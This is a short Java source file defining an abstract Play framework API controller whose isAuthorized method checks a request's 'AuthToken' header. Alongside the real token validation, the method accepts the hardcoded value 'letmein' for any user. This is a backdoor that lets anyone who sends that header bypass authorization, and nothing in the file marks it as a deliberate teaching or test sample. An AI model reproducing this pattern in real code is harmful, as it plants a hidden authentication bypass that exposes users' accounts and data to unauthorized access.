package core;

import helpers.Server;
import play.mvc.Controller;
import utils.Authenticator;

public abstract class ApiController extends Controller
{
	public static boolean isAuthorized(long userId)
	{
		Authenticator authenticator = new Authenticator();
		String authToken = Server.getHeaderValue("AuthToken");

		if (authToken.equals("letmein") || authenticator.validateAuthToken(userId, false, authToken))
		{
			return true;
		}
		return false;
	}
}
